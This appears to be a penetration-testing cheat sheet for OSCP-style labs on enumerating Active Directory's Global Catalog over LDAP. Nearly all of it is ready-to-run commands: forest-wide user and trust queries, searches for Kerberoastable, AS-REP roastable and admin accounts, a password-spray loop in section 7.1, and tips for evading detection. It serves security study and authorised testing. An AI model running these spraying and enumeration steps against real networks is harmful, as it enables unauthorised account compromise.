# Port 3268 - Global Catalog (LDAP) Enumeration & Exploitation

## Service Information

**Port:** 3268/TCP (Global Catalog), 3269/TCP (Global Catalog SSL)
**Service:** Global Catalog (GC) - Active Directory service
**Protocol:** LDAP (Lightweight Directory Access Protocol)
**Purpose:** Read-only partial replica of ALL objects in AD forest

---

## 1. Basic Concepts

### 1.1 What is Global Catalog?

**Global Catalog vs Standard LDAP:**
- **Standard LDAP (389)**: Full information about objects in ONE domain
- **Global Catalog (3268)**: Partial information about ALL objects in ENTIRE forest
- **Use Cases**:
  - Cross-domain queries
  - User Principal Name (UPN) lookups
  - Universal Group membership
  - Exchange Address List lookups

### 1.2 Port Differences

| Port | Service | SSL | Scope |
|------|---------|-----|-------|
| 389 | LDAP | No | Single Domain (full attributes) |
| 636 | LDAPS | Yes | Single Domain (full attributes) |
| 3268 | GC | No | Entire Forest (partial attributes) |
| 3269 | GC SSL | Yes | Entire Forest (partial attributes) |

---

## 2. Basic Enumeration

### 2.1 Nmap Scan

```bash
# Basic scan
nmap -p 3268,3269 -sV TARGET_IP

# Detailed scan with scripts
nmap -p 3268,3269 -sV -sC TARGET_IP

# LDAP scripts (work on GC too)
nmap -p 3268 --script ldap-* TARGET_IP

# Search for rootDSE
nmap -p 3268 --script ldap-rootdse TARGET_IP

# Both GC and LDAP
nmap -p 389,636,3268,3269 -sV -sC TARGET_IP
```

### 2.2 Banner Grabbing

```bash
# Netcat (limited usefulness for LDAP)
nc -nv TARGET_IP 3268

# ldapsearch (best method)
ldapsearch -x -H ldap://TARGET_IP:3268 -s base

# Global Catalog SSL
ldapsearch -x -H ldaps://TARGET_IP:3269 -s base
```

---

## 3. Anonymous LDAP Bind

### 3.1 Test Anonymous Bind

```bash
# Check if anonymous bind is allowed
ldapsearch -x -H ldap://TARGET_IP:3268 -b "DC=domain,DC=local"

# If successful, you get data without credentials!
# If failed: "Operations error" or "Confidentiality required"

# Global Catalog SSL (3269)
ldapsearch -x -H ldaps://TARGET_IP:3269 -b "DC=domain,DC=local"
```

### 3.2 Get Domain Information

```bash
# Get rootDSE (naming contexts)
ldapsearch -x -H ldap://TARGET_IP:3268 -s base namingContexts

# Response shows all domains in forest:
# namingContexts: DC=corp,DC=local
# namingContexts: DC=child,DC=corp,DC=local
# namingContexts: DC=external,DC=local

# Get all domains in forest
ldapsearch -x -H ldap://TARGET_IP:3268 -b "" -s base "(objectclass=*)" namingContexts
```

---

## 4. Authenticated Enumeration

### 4.1 With Domain Credentials

```bash
# Basic authenticated query
ldapsearch -x -H ldap://TARGET_IP:3268 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local"

# Simpler syntax with user@domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"

# Query specific attributes
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName mail
```

### 4.2 Enumerate Users Across Forest

```bash
# Query ALL users in ENTIRE forest (not just one domain)
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Get users from ALL domains
for domain in DC=corp,DC=local DC=child,DC=corp,DC=local; do
  echo "=== $domain ==="
  ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "$domain" "(objectClass=user)" sAMAccountName
done
```

### 4.3 Enumerate Groups Across Forest

```bash
# Universal groups (visible in GC)
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=group)" cn member

# Domain Local and Global groups are NOT fully replicated to GC
# Only Universal groups are fully available
```

---

## 5. Cross-Domain Enumeration

### 5.1 Multi-Domain Forest Queries

```bash
# List all domains in forest
ldapsearch -x -H ldap://TARGET_IP:3268 -s base -b "" namingContexts

# Example forest structure:
# corp.local (root domain)
#   ├── child1.corp.local
#   ├── child2.corp.local
#   └── eu.corp.local

# Query users in root domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=user)"

# Query users in child domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@corp.local" -w 'pass' -b "DC=child1,DC=corp,DC=local" "(objectClass=user)"
```

### 5.2 Find Specific Users Across Domains

```bash
# Find user "admin" in ANY domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(sAMAccountName=admin)"

# Find by email (UPN lookup)
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(userPrincipalName=admin@child1.corp.local)"

# Find all domain admins across forest
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=*)"
```

---

## 6. Useful LDAP Queries via GC

### 6.1 User Enumeration

```bash
# All users
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName

# Users with SPN (Kerberoastable)
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users without Kerberos Pre-Auth (AS-REP Roastable)
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Admin users
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName
```

### 6.2 Computer Enumeration

```bash
# All computers
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=computer)" cn operatingSystem

# Domain Controllers
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" cn

# Servers
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=computer)(operatingSystem=*Server*))" cn
```

### 6.3 Trust Enumeration

```bash
# Find trust relationships
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=trustedDomain)" name trustDirection

# Cross-forest trusts
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "CN=System,DC=domain,DC=local" "(objectClass=trustedDomain)"
```

---

## 7. Exploitation via LDAP/GC

### 7.1 Password Spray Attack

```bash
# Via ldapsearch (check if credentials work)
# Test single password against multiple users

for user in $(cat users.txt); do
  ldapsearch -x -H ldap://TARGET_IP:3268 -D "$user@domain.local" -w 'Password123!' -b "DC=domain,DC=local" -s base &>/dev/null && echo "[+] $user:Password123!"
done
```

### 7.2 Credential Validation

```bash
# Validate credentials via LDAP bind
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" -s base

# Successful bind = valid credentials
# Failed bind = invalid credentials

# Test across multiple domains
ldapsearch -x -H ldap://TARGET_IP:3268 -D "admin@child.corp.local" -w 'pass' -b "" -s base
```

---

## 8. Tools & Scripts

### 8.1 ldapdomaindump

```bash
# Enumerate entire domain via LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' TARGET_IP:3268

# Output: HTML/JSON/Grep files with users, groups, computers

# Specify output directory
ldapdomaindump -u 'DOMAIN\user' -p 'password' -o /tmp/ldap_dump TARGET_IP:3268
```

### 8.2 windapsearch

```bash
# Python LDAP enumeration tool
./windapsearch.py -d domain.local -u user -p password --dc-ip TARGET_IP -p 3268

# Enumerate users
./windapsearch.py -d domain.local -u user -p password --dc-ip TARGET_IP -p 3268 -U

# Enumerate computers
./windapsearch.py -d domain.local -u user -p password --dc-ip TARGET_IP -p 3268 -C

# Kerberoastable users
./windapsearch.py -d domain.local -u user -p password --dc-ip TARGET_IP -p 3268 --kerberoast
```

### 8.3 PowerView (from Windows)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Query Global Catalog
Get-DomainUser -Server "TARGET_IP:3268"
Get-DomainComputer -Server "TARGET_IP:3268"
Get-DomainGroup -Server "TARGET_IP:3268"

# Cross-domain queries
Get-DomainUser -Domain child.corp.local -Server "TARGET_IP:3268"
```

---

## 9. Attack Scenarios

### 9.1 Cross-Domain User Discovery

**Scenario:** You have credentials in child.corp.local, want to find admins in corp.local

```bash
# Query parent domain via GC
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@child.corp.local" -w 'pass' -b "DC=corp,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Find Domain Admins in root domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@child.corp.local" -w 'pass' -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)"
```

### 9.2 Kerberoasting Across Forest

```bash
# Find all Kerberoastable users in ENTIRE forest
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName distinguishedName

# Extract SPNs for Kerberoasting
# Then use impacket-GetUserSPNs or Rubeus
```

---

## 10. Defense Evasion

### 10.1 Blend with Legitimate Traffic

```bash
# Use authenticated queries (look like normal AD queries)
# Avoid anonymous binds if possible
# Throttle requests to avoid detection
```

### 10.2 Query via Standard LDAP First

```bash
# Query standard LDAP (389) first
ldapsearch -x -H ldap://TARGET_IP:389 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local"

# Then switch to GC only if needed for cross-domain
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=corp,DC=local"
```

---

## 11. Quick Reference

### Quick Enumeration
```bash
# Check if GC is accessible
nmap -p 3268,3269 TARGET_IP

# Anonymous bind test
ldapsearch -x -H ldap://TARGET_IP:3268 -b "DC=domain,DC=local"

# Get domain list
ldapsearch -x -H ldap://TARGET_IP:3268 -s base namingContexts
```

### Quick Authenticated Enum
```bash
# All users
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Kerberoastable
ldapsearch -x -H ldap://TARGET_IP:3268 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))"
```

### Quick Tools
```bash
# ldapdomaindump
ldapdomaindump -u 'DOMAIN\user' -p 'pass' TARGET_IP:3268

# windapsearch
./windapsearch.py -d domain.local -u user -p pass --dc-ip TARGET_IP -p 3268 -U
```

---

## 12. OSCP Tips

⚠️ **Global Catalog Priority for OSCP:**
- **Often overlooked** → Easy wins!
- If you have creds in child domain, query root via GC
- Find Kerberoastable users across ENTIRE forest
- Enumerate ALL domains at once
- Look for cross-domain admin groups
- Check for AS-REP Roastable users
- Universal Groups are fully replicated to GC

**Common OSCP scenarios:**
1. Multi-domain forest → Use GC to enumerate all domains
2. Child domain creds → Find admins in parent via GC
3. Cross-domain Kerberoasting opportunities
4. Discovery of additional domains via namingContexts

---

## 13. Comparison: LDAP vs Global Catalog

| Feature | LDAP (389) | Global Catalog (3268) |
|---------|------------|----------------------|
| Scope | Single domain | Entire forest |
| Attributes | All attributes | Partial (PAS) |
| Cross-domain | No | Yes |
| Speed | Slower (full data) | Faster (partial data) |
| Use Case | Detailed single-domain queries | Cross-domain searches |

**When to use GC:**
- Finding users/computers across multiple domains
- UPN-based lookups
- Universal Group membership queries
- Fast cross-domain searches

---

## 14. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| ldapsearch | Manual queries | `ldapsearch -x -H ldap://TARGET:3268` |
| ldapdomaindump | Automated enumeration | `ldapdomaindump -u USER -p PASS TARGET:3268` |
| windapsearch | Python enumeration | `./windapsearch.py -p 3268` |
| Nmap | Service detection | `nmap -p 3268 --script ldap-* TARGET` |
| PowerView | Windows enumeration | `Get-DomainUser -Server "TARGET:3268"` |

---

## 15. Resources

- **HackTricks LDAP**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- **Microsoft Global Catalog**: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/global-catalog-server-role
- **LDAP Filter Syntax**: https://ldap.com/ldap-filters/
